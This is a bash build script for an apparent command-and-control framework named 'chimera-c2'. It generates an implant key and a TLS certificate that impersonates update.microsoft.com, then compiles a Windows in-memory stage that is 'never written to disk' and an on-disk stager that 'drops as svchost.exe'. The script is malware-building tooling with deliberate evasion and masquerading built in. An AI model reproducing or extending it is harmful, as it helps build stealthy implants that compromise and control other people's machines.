#!/bin/bash
set -e

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
PROJECT_DIR="$(dirname "$SCRIPT_DIR")"

cd "$PROJECT_DIR"

# Generate implant key
KEY=$(openssl rand -hex 32)
echo "[*] Generated key: $KEY"
echo "$KEY" > server/static.key
echo "[*] Saved key to server/static.key"

# Generate server cert (if it doesn't exist)
if [ ! -f server/server.crt ]; then
    openssl req -x509 -newkey rsa:4096 -sha256 -days 365 -nodes \
        -keyout server/server.key -out server/server.crt \
        -subj "/CN=update.microsoft.com" 2>/dev/null
    echo "[*] Generated server/server.crt and server/server.key"
fi

# Compute cert pin (SHA-256 of DER-encoded cert)
PIN=$(openssl x509 -in server/server.crt -outform DER | sha256sum | cut -d' ' -f1)
echo "[*] Cert pin: $PIN"

# Copy the malleable profile into the common package (required by go:embed)
cp "$PROJECT_DIR/profile.json" "$SCRIPT_DIR/internal/common/profile.json"

LDFLAGS="-s -w \
-X github.com/terancebana/chimera-c2/implant/internal/common.StaticKeyHex=$KEY \
-X github.com/terancebana/chimera-c2/implant/internal/common.CertPinHex=$PIN \
-X github.com/terancebana/chimera-c2/implant/internal/common.ResolverURL=https://localhost:8080"

# Build the in-memory STAGE (the full implant, never written to disk)
GOOS=windows GOARCH=amd64 go build \
    -ldflags "$LDFLAGS" \
    -o stage/stage.exe \
    ./implant/

echo "[+] Stage built: stage/stage.exe"

# Build the on-disk STAGER (tiny loader; drops as svchost.exe)
GOOS=windows GOARCH=amd64 go build \
    -ldflags "$LDFLAGS" \
    -o implant/stager.exe \
    ./implant/stager/

echo "[+] Stager built: implant/stager.exe"
